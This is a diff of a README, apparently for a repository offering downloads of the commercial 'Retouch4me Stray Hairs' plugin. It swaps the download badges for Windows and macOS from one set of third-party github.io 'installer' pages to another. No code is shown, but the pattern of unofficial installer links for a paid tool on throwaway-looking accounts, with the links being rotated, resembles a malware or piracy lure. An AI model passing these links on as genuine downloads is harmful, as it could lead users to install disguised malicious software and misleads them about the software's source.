@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Retouch4me Stray Hairs](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_RETOUCH4ME_STRAY_HAIRS-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download Retouch4me Stray Hairs](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_RETOUCH4ME_STRAY_HAIRS-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Retouch4me Stray Hairs** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-B71C1C?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-B71C1C?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-B71C1C?style=for-the-badge&logo=windows&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-B71C1C?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
 
 </div>
 
